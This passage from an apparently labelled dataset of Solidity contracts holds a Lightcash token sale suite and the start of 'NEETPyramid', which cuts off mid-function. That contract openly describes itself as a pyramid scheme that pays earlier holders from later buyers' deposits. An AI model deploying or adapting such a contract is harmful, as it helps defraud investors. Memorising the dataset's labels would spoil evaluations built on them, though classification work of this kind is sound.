totalSupply;\r\r\n  function balanceOf(address who) public view returns (uint256);\r\r\n  function transfer(address to, uint256 value) public returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/token\/BasicToken.sol\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances.\r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n    require(_value <= balances[msg.sender]);\r\r\n\r\r\n    \/\/ SafeMath.sub will throw if there is not enough balance.\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of.\r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/token\/ERC20.sol\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) public view returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\r\r\n  function approve(address spender, uint256 value) public returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/token\/StandardToken.sol\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) internal allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amount of tokens to be transferred\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n    require(_value <= balances[_from]);\r\r\n    require(_value <= allowed[_from][msg.sender]);\r\r\n\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   *\r\r\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\r\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\r\n   * race condition is to first reduce the spender&#39;s allowance to 0 and set the desired value afterwards:\r\r\n   * https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) public view returns (uint256) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * approve should be called when allowed[_spender] == 0. To increment\r\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until\r\r\n   * the first transaction is mined)\r\r\n   * From MonolithDAO Token.sol\r\r\n   *\/\r\r\n  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\r\n    uint oldValue = allowed[msg.sender][_spender];\r\r\n    if (_subtractedValue > oldValue) {\r\r\n      allowed[msg.sender][_spender] = 0;\r\r\n    } else {\r\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\r\n    }\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/LightcashCryptoToken.sol\r\r\n\r\r\ncontract LightcashCryptoToken is StandardToken, Ownable {\r\r\n\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n\r\r\n  event MintFinished();\r\r\n\r\r\n  string public constant name = &#39;Lightcash crypto&#39;;\r\r\n\r\r\n  string public constant symbol = &#39;LCSH&#39;;\r\r\n\r\r\n  uint32 public constant decimals = 18;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  address public saleAgent;\r\r\n\r\r\n  mapping(address => bool) public authorized;\r\r\n\r\r\n  mapping(address => bool)  public registeredCallbacks;\r\r\n\r\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n    return processCallback(super.transfer(_to, _value), msg.sender, _to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\r\n    return processCallback(super.transferFrom(from, to, value), from, to, value);\r\r\n  }\r\r\n\r\r\n  function setSaleAgent(address newSaleAgent) public {\r\r\n    require(saleAgent == msg.sender || owner == msg.sender);\r\r\n    saleAgent = newSaleAgent;\r\r\n  }\r\r\n\r\r\n  function mint(address _to, uint256 _amount) public returns (bool) {\r\r\n    require(!mintingFinished);\r\r\n    require(msg.sender == saleAgent);\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(address(0), _amount);\r\r\n    Transfer(address(0), _to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function finishMinting() public returns (bool) {\r\r\n    require(!mintingFinished);\r\r\n    require(msg.sender == owner || msg.sender == saleAgent);\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function registerCallback(address callback) public onlyOwner {\r\r\n    registeredCallbacks[callback] = true;\r\r\n  }\r\r\n\r\r\n  function deregisterCallback(address callback) public onlyOwner {\r\r\n    registeredCallbacks[callback] = false;\r\r\n  }\r\r\n\r\r\n  function processCallback(bool result, address from, address to, uint value) internal returns(bool) {\r\r\n    if (result && registeredCallbacks[to]) {\r\r\n      ReceivingContractCallback targetCallback = ReceivingContractCallback(to);\r\r\n      targetCallback.tokenFallback(from, value);\r\r\n    }\r\r\n    return result;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/CommonTokenEvent.sol\r\r\n\r\r\ncontract CommonTokenEvent is Ownable {\r\r\n\r\r\n  using SafeMath for uint;\r\r\n\r\r\n  uint public constant PERCENT_RATE = 100;\r\r\n\r\r\n  uint public price;\r\r\n\r\r\n  uint public start;\r\r\n\r\r\n  uint public period;\r\r\n\r\r\n  uint public minPurchaseLimit;\r\r\n\r\r\n  uint public minted;\r\r\n\r\r\n  uint public hardcap;\r\r\n\r\r\n  uint public invested;\r\r\n\r\r\n  uint public referrerPercent;\r\r\n\r\r\n  uint public maxReferrerTokens;\r\r\n\r\r\n  address public directMintAgent;\r\r\n\r\r\n  address public wallet;\r\r\n\r\r\n  LightcashCryptoToken public token;\r\r\n\r\r\n  modifier canMint() {\r\r\n    require(now >= start && now < lastSaleDate() && msg.value >= minPurchaseLimit && minted < hardcap);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyDirectMintAgentOrOwner() {\r\r\n    require(directMintAgent == msg.sender || owner == msg.sender);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function sendReferrerTokens(uint tokens) internal {\r\r\n    if (msg.data.length == 20) {\r\r\n      address referrer = bytesToAddres(bytes(msg.data));\r\r\n      require(referrer != address(token) && referrer != msg.sender);\r\r\n      uint referrerTokens = tokens.mul(referrerPercent).div(PERCENT_RATE);\r\r\n      if(referrerTokens > maxReferrerTokens) {\r\r\n        referrerTokens = maxReferrerTokens;\r\r\n      }\r\r\n      mintAndSendTokens(referrer, referrerTokens);\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function bytesToAddres(bytes source) internal pure returns(address) {\r\r\n    uint result;\r\r\n    uint mul = 1;\r\r\n    for (uint i = 20; i > 0; i--) {\r\r\n      result += uint8(source[i-1])*mul;\r\r\n      mul = mul*256;\r\r\n    }\r\r\n    return address(result);\r\r\n  }\r\r\n\r\r\n  function setMaxReferrerTokens(uint newMaxReferrerTokens) public onlyOwner {\r\r\n    maxReferrerTokens = newMaxReferrerTokens;\r\r\n  }\r\r\n\r\r\n  function setHardcap(uint newHardcap) public onlyOwner {\r\r\n    hardcap = newHardcap;\r\r\n  }\r\r\n\r\r\n  function setToken(address newToken) public onlyOwner {\r\r\n    token = LightcashCryptoToken(newToken);\r\r\n  }\r\r\n\r\r\n  function setReferrerPercent(uint newReferrerPercent) public onlyOwner {\r\r\n    referrerPercent = newReferrerPercent;\r\r\n  }\r\r\n\r\r\n  function setStart(uint newStart) public onlyOwner {\r\r\n    start = newStart;\r\r\n  }\r\r\n\r\r\n  function setPrice(uint newPrice) public onlyOwner {\r\r\n    price = newPrice;\r\r\n  }\r\r\n\r\r\n  function lastSaleDate() public view returns(uint) {\r\r\n    return start + period * 1 days;\r\r\n  }\r\r\n\r\r\n  function setMinPurchaseLimit(uint newMinPurchaseLimit) public onlyOwner {\r\r\n    minPurchaseLimit = newMinPurchaseLimit;\r\r\n  }\r\r\n\r\r\n  function setWallet(address newWallet) public onlyOwner {\r\r\n    wallet = newWallet;\r\r\n  }\r\r\n\r\r\n  function setDirectMintAgent(address newDirectMintAgent) public onlyOwner {\r\r\n    directMintAgent = newDirectMintAgent;\r\r\n  }\r\r\n\r\r\n  function directMint(address to, uint investedWei) public onlyDirectMintAgentOrOwner {\r\r\n    calculateAndTransferTokens(to, investedWei);\r\r\n  }\r\r\n\r\r\n  function directMintTokens(address to, uint count) public onlyDirectMintAgentOrOwner {\r\r\n    mintAndSendTokens(to, count);\r\r\n  }\r\r\n\r\r\n  function mintAndSendTokens(address to, uint amount) internal {\r\r\n    token.mint(to, amount);\r\r\n    minted = minted.add(amount);\r\r\n  }\r\r\n\r\r\n  function calculateAndTransferTokens(address to, uint investedInWei) internal returns(uint) {\r\r\n    uint tokens = calculateTokens(investedInWei);\r\r\n    mintAndSendTokens(to, tokens);\r\r\n    invested = invested.add(investedInWei);\r\r\n    return tokens;\r\r\n  }\r\r\n\r\r\n  function calculateAndTransferTokensWithReferrer(address to, uint investedInWei) internal {\r\r\n    uint tokens = calculateAndTransferTokens(to, investedInWei);\r\r\n    sendReferrerTokens(tokens);\r\r\n  }\r\r\n\r\r\n  function calculateTokens(uint investedInWei) public view returns(uint);\r\r\n\r\r\n  function createTokens() public payable;\r\r\n\r\r\n  function() external payable {\r\r\n    createTokens();\r\r\n  }\r\r\n\r\r\n  function retrieveTokens(address to, address anotherToken) public onlyOwner {\r\r\n    ERC20 alienToken = ERC20(anotherToken);\r\r\n    alienToken.transfer(to, alienToken.balanceOf(this));\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/PreTGE.sol\r\r\n\r\r\ncontract PreTGE is CommonTokenEvent {\r\r\n\r\r\n  uint public softcap;\r\r\n\r\r\n  bool public refundOn;\r\r\n\r\r\n  bool public softcapAchieved;\r\r\n\r\r\n  address public nextSaleAgent;\r\r\n\r\r\n  mapping (address => uint) public balances;\r\r\n\r\r\n  event RefundsEnabled();\r\r\n\r\r\n  event SoftcapReached();\r\r\n\r\r\n  event Refunded(address indexed beneficiary, uint256 weiAmount);\r\r\n\r\r\n  function setPeriod(uint newPeriod) public onlyOwner {\r\r\n    period = newPeriod;\r\r\n  }\r\r\n\r\r\n  function calculateTokens(uint investedInWei) public view returns(uint) {\r\r\n    return investedInWei.mul(price).div(1 ether);\r\r\n  }\r\r\n\r\r\n  function setNextSaleAgent(address newNextSaleAgent) public onlyOwner {\r\r\n    nextSaleAgent = newNextSaleAgent;\r\r\n  }\r\r\n\r\r\n  function setSoftcap(uint newSoftcap) public onlyOwner {\r\r\n    softcap = newSoftcap;\r\r\n  }\r\r\n\r\r\n  function refund() public {\r\r\n    require(now > start && refundOn && balances[msg.sender] > 0);\r\r\n    uint value = balances[msg.sender];\r\r\n    balances[msg.sender] = 0;\r\r\n    msg.sender.transfer(value);\r\r\n    Refunded(msg.sender, value);\r\r\n  }\r\r\n\r\r\n  function widthraw() public {\r\r\n    require(softcapAchieved);\r\r\n    wallet.transfer(this.balance);\r\r\n  }\r\r\n\r\r\n  function createTokens() public payable canMint {\r\r\n    balances[msg.sender] = balances[msg.sender].add(msg.value);\r\r\n    super.calculateAndTransferTokensWithReferrer(msg.sender, msg.value);\r\r\n    if (!softcapAchieved && minted >= softcap) {\r\r\n      softcapAchieved = true;\r\r\n      SoftcapReached();\r\r\n    }\r\r\n  }\r\r\n\r\r\n  function finish() public onlyOwner {\r\r\n    if (!softcapAchieved) {\r\r\n      refundOn = true;\r\r\n      RefundsEnabled();\r\r\n    } else {\r\r\n      widthraw();\r\r\n      token.setSaleAgent(nextSaleAgent);\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/StagedTokenEvent.sol\r\r\n\r\r\ncontract StagedTokenEvent is CommonTokenEvent {\r\r\n\r\r\n  using SafeMath for uint;\r\r\n\r\r\n  struct Stage {\r\r\n    uint period;\r\r\n    uint discount;\r\r\n  }\r\r\n\r\r\n  uint public constant STAGES_PERCENT_RATE = 100;\r\r\n\r\r\n  Stage[] public stages;\r\r\n\r\r\n  function stagesCount() public constant returns(uint) {\r\r\n    return stages.length;\r\r\n  }\r\r\n\r\r\n  function addStage(uint stagePeriod, uint discount) public onlyOwner {\r\r\n    require(stagePeriod > 0);\r\r\n    stages.push(Stage(stagePeriod, discount));\r\r\n    period = period.add(stagePeriod);\r\r\n  }\r\r\n\r\r\n  function removeStage(uint8 number) public onlyOwner {\r\r\n    require(number >= 0 && number < stages.length);\r\r\n\r\r\n    Stage storage stage = stages[number];\r\r\n    period = period.sub(stage.period);\r\r\n\r\r\n    delete stages[number];\r\r\n\r\r\n    for (uint i = number; i < stages.length - 1; i++) {\r\r\n      stages[i] = stages[i+1];\r\r\n    }\r\r\n\r\r\n    stages.length--;\r\r\n  }\r\r\n\r\r\n  function changeStage(uint8 number, uint stagePeriod, uint discount) public onlyOwner {\r\r\n    require(number >= 0 && number < stages.length);\r\r\n\r\r\n    Stage storage stage = stages[number];\r\r\n\r\r\n    period = period.sub(stage.period);\r\r\n\r\r\n    stage.period = stagePeriod;\r\r\n    stage.discount = discount;\r\r\n\r\r\n    period = period.add(stagePeriod);\r\r\n  }\r\r\n\r\r\n  function insertStage(uint8 numberAfter, uint stagePeriod, uint discount) public onlyOwner {\r\r\n    require(numberAfter < stages.length);\r\r\n\r\r\n\r\r\n    period = period.add(stagePeriod);\r\r\n\r\r\n    stages.length++;\r\r\n\r\r\n    for (uint i = stages.length - 2; i > numberAfter; i--) {\r\r\n      stages[i + 1] = stages[i];\r\r\n    }\r\r\n\r\r\n    stages[numberAfter + 1] = Stage(period, discount);\r\r\n  }\r\r\n\r\r\n  function clearStages() public onlyOwner {\r\r\n    for (uint i = 0; i < stages.length; i++) {\r\r\n      delete stages[i];\r\r\n    }\r\r\n    stages.length -= stages.length;\r\r\n    period = 0;\r\r\n  }\r\r\n\r\r\n  function getDiscount() public constant returns(uint) {\r\r\n    uint prevTimeLimit = start;\r\r\n    for (uint i = 0; i < stages.length; i++) {\r\r\n      Stage storage stage = stages[i];\r\r\n      prevTimeLimit += stage.period * 1 days;\r\r\n      if (now < prevTimeLimit)\r\r\n        return stage.discount;\r\r\n    }\r\r\n    revert();\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/TGE.sol\r\r\n\r\r\ncontract TGE is StagedTokenEvent {\r\r\n\r\r\n  address public extraTokensWallet;\r\r\n\r\r\n  uint public extraTokensPercent;\r\r\n\r\r\n  bool public finished = false;\r\r\n\r\r\n  function setExtraTokensWallet(address newExtraTokensWallet) public onlyOwner {\r\r\n    extraTokensWallet = newExtraTokensWallet;\r\r\n  }\r\r\n\r\r\n  function setExtraTokensPercent(uint newExtraTokensPercent) public onlyOwner {\r\r\n    extraTokensPercent = newExtraTokensPercent;\r\r\n  }\r\r\n\r\r\n  function calculateTokens(uint investedInWei) public view returns(uint) {\r\r\n    return investedInWei.mul(price).mul(STAGES_PERCENT_RATE).div(STAGES_PERCENT_RATE.sub(getDiscount())).div(1 ether);\r\r\n  }\r\r\n\r\r\n  function finish() public onlyOwner {\r\r\n    require(!finished);\r\r\n    finished = true;\r\r\n    uint256 totalSupply = token.totalSupply();\r\r\n    uint allTokens = totalSupply.mul(PERCENT_RATE).div(PERCENT_RATE.sub(extraTokensPercent));\r\r\n    uint extraTokens = allTokens.mul(extraTokensPercent).div(PERCENT_RATE);\r\r\n    mintAndSendTokens(extraTokensWallet, extraTokens);\r\r\n  }\r\r\n\r\r\n  function createTokens() public payable canMint {\r\r\n    require(!finished);\r\r\n    wallet.transfer(msg.value);\r\r\n    calculateAndTransferTokensWithReferrer(msg.sender, msg.value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/Deployer.sol\r\r\n\r\r\ncontract Deployer is Ownable {\r\r\n\r\r\n  LightcashCryptoToken public token;\r\r\n\r\r\n  PreTGE public preTGE;\r\r\n\r\r\n  TGE public tge;\r\r\n\r\r\n  function deploy() public onlyOwner {\r\r\n    token = new LightcashCryptoToken();\r\r\n\r\r\n    preTGE = new PreTGE();\r\r\n    preTGE.setPrice(7143000000000000000000);\r\r\n    preTGE.setMinPurchaseLimit(100000000000000000);\r\r\n    preTGE.setSoftcap(7142857000000000000000000);\r\r\n    preTGE.setHardcap(52500000000000000000000000);\r\r\n    preTGE.setStart(1517230800);\r\r\n    preTGE.setPeriod(11);\r\r\n    preTGE.setWallet(0xDFDCAc0c9Eb45C63Bcff91220A48684882F1DAd0);\r\r\n    preTGE.setMaxReferrerTokens(10000000000000000000000);\r\r\n    preTGE.setReferrerPercent(10);\r\r\n\r\r\n    tge = new TGE();\r\r\n    tge.setPrice(5000000000000000000000);\r\r\n    tge.setMinPurchaseLimit(10000000000000000);\r\r\n    tge.setHardcap(126000000000000000000000000);\r\r\n    tge.setStart(1517835600);\r\r\n    tge.setWallet(0x3aC45b49A4D3CB35022fd8122Fd865cd1B47932f);\r\r\n    tge.setExtraTokensWallet(0xF0e830148F3d1C4656770DAa282Fda6FAAA0Fe0B);\r\r\n    tge.setExtraTokensPercent(15);\r\r\n    tge.addStage(7, 20);\r\r\n    tge.addStage(7, 15);\r\r\n    tge.addStage(7, 10);\r\r\n    tge.addStage(1000, 5);\r\r\n    tge.setMaxReferrerTokens(10000000000000000000000);\r\r\n    tge.setReferrerPercent(10);\r\r\n\r\r\n    preTGE.setToken(token);\r\r\n    tge.setToken(token);\r\r\n    preTGE.setNextSaleAgent(tge);\r\r\n    token.setSaleAgent(preTGE);\r\r\n\r\r\n    address newOnwer = 0xF51E0a3a17990D41C5f1Ff1d0D772b26E4D6B6d0;\r\r\n    token.transferOwnership(newOnwer);\r\r\n    preTGE.transferOwnership(newOnwer);\r\r\n    tge.transferOwnership(newOnwer);\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/*\r\r\n          ,\/`.\r\r\n        ,&#39;\/ __`.\r\r\n      ,&#39;_\/_ _A _`.\r\r\n    ,&#39;__\/_ NEET _  `.\r\r\n  ,&#39;_  \/__ WILL _ __ `.\r\r\n &#39;-.._\/____RISE\"-.-..__`.\r\r\n  \r\r\n\r\r\n NEETPyramid. A bullshit, non-transparent, somwhat self-sustaining pyramid scheme for NEETs by NEETs. Totally not a scam. Okay maybe.\r\r\n \r\r\n Inspired by https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/\r\r\n\r\r\n Developers:\r\r\n \tNotJustinSun\r\r\n \tNotBrandonEnrich\r\r\n \tNotYourMum\r\r\n \r\r\n*\/\r\r\n\r\r\ncontract NEETPyramid {\r\r\n\r\r\n\t\/\/ scaleFactor is used to convert Ether into tokens and vice-versa: they&#39;re of different\r\r\n\t\/\/ orders of magnitude, hence the need to bridge between the two.\r\r\n\tuint256 constant scaleFactor = 0x10000000000000000;  \/\/ 2^64\r\r\n\r\r\n\t\/\/ CRR = 50%\r\r\n\t\/\/ CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).\r\r\n\t\/\/ For more on this: check out https:\/\/en.wikipedia.org\/wiki\/Reserve_requirement\r\r\n\tint constant crr_n = 1; \/\/ CRR numerator\r\r\n\tint constant crr_d = 2; \/\/ CRR denominator\r\r\n\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\t\/\/ the amount in reserve is 0.5 ether and token price is 1 Ether.\r\r\n\tint constant price_coeff = -0x296ABF784A358468C;\r\r\n\r\r\n\t\/\/ Typical values that we have to declare.\r\r\n\tstring constant public name = \"NEETPyramid\";\r\r\n\tstring constant public symbol = \"NPY\";\r\r\n\tuint8 constant public decimals = 18;\r\r\n\r\r\n\t\/\/ Array between each address and their number of tokens.\r\r\n\tmapping(address => uint256) public tokenBalance;\r\r\n\t\t\r\r\n\t\/\/ Array between each address and how much Ether has been paid out to it.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tmapping(address => int256) public payouts;\r\r\n\r\r\n\t\/\/ Variable tracking how many tokens are in existence overall.\r\r\n\tuint256 public totalSupply;\r\r\n\r\r\n\t\/\/ Aggregate sum of all payouts.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tint256 totalPayouts;\r\r\n\r\r\n\t\/\/ Variable tracking how much Ether each token is currently worth.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tuint256 earningsPerToken;\r\r\n\t\r\r\n\t\/\/ Current contract balance in Ether\r\r\n\tuint256 public contractBalance;\r\r\n\r\r\n\tfunction NEETPyramid() public {}\r\r\n\r\r\n\t\/\/ The following functions are used by the front-end for display purposes.\r\r\n\r\r\n\t\/\/ Returns the number of tokens currently held by _owner.\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n\t\treturn tokenBalance[_owner];\r\r\n\t}\r\r\n\r\r\n\t\/\/ Withdraws all dividends held by the caller sending the transaction, updates\r\r\n\t\/\/ the requisite global variables, and transfers Ether back to the caller.\r\r\n\tfunction withdraw() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\t\tmsg.sender.transfer(balance);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts the Ether accrued as dividends back into NPY tokens without having to\r\r\n\t\/\/ withdraw it first. Saves on gas and potential price spike loss.\r\r\n\tfunction reinvestDividends() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\t\/\/ Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Assign balance to a new variable.\r\r\n\t\tuint value_ = (uint) (balance);\r\r\n\t\t\r\r\n\t\t\/\/ If your dividends are worth less than 1 szabo, or more than a million Ether\r\r\n\t\t\/\/ (in which case, why are you even here), abort.\r\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ A temporary reserve variable used for calculating the reward the holder gets for buying tokens.\r\r\n\t\t\/\/ (Yes, the buyer receives a part of the distribution as well!)\r\r\n\t\tvar res = reserve() - balance;\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(value_, 10);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = value_ - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = calculateDividendTokens(numEther, balance);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you&#39;re gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (res + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\t\t}\r\r\n\t\t\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We&#39;re a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sells your tokens for Ether. This Ether is assigned to the callers entry\r\r\n\t\/\/ in the tokenBalance array, and therefore is shown as a dividend. A second\r\r\n\t\/\/ call to withdraw() must be made to invoke the transfer of Ether back to your address.\r\r\n\tfunction sellMyTokens() public {\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\t\tsell(balance);\r\r\n\t}\r\r\n\r\r\n\t\/\/ The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately\r\r\n\t\/\/ invokes the withdraw() function, sending the resulting Ether to the callers address.\r\r\n    function getMeOutOfHere() public {\r\r\n\t\tsellMyTokens();\r\r\n        withdraw();\r\r\n\t}\r\r\n\r\r\n\t\/\/ Gatekeeper function to check if the amount of Ether being sent isn&#39;t either\r\r\n\t\/\/ too small or too large. If it passes, goes direct to buy().\r\r\n\tfunction fund() payable public 